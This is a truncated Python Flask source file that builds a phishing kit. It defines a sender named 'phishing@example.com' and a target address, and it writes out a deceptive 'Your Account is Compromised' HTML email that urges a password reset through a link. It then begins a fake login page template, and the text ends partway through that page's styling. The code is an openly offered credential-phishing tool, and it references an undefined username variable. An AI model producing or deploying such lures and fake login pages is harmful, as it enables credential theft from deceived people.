import flask
from flask_mail import Mail
import smtplib
import os

app = flask.Flask(__name__)

# Configure the Flask app
app.config['Debug'] = True
app.config['Testing'] = True

# Email configuration
email = Mail(app)

# Sample email details
sender_email = 'phishing@example.com'
receiver_email = 'target@example.com'
subject = 'Security Alert: Your Account is Compromised'
phishing_link = 'http://localhost:5000'

# Email content
email_body = f"""
    <html>
        <body>
            <div style="max-width: 600px; margin: 20px auto; font-family: Arial, sans-serif;">
                <div style="text-align: center; padding: 20px;">
                    <h1 style="color: #3333cc; margin: 0 0 20px 0;">Security Alert: Your Account is Compromised</h1>
                    <p style="margin: 20px 0;">Dear {username},</p>
                    <p style="margin: 20px 0;">We noticed unusual activity on your account. For your security, please reset your password immediately.</p>
                    <a href={phishing_link} style="background-color: #0E0E0E; color: #fff; padding: 10px 20px; text-decoration: none; display: inline-block; margin: 20px 0;">Click here to Reset Password</a>
                    <p style="margin-top: 20px;">If you did not request this email, your account may be at risk. Please ensure you are using a secure connection when logging in.</p>
                </div>
            </div>
        </body>
        </html>
    """

# Create fake login page HTML
login_html = """
    <!DOCTYPE html>
    <html>
        <head>
            <title>Login</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f0f0f0;
                    margin: 0;
                    padding: 0;
                }
                .container {
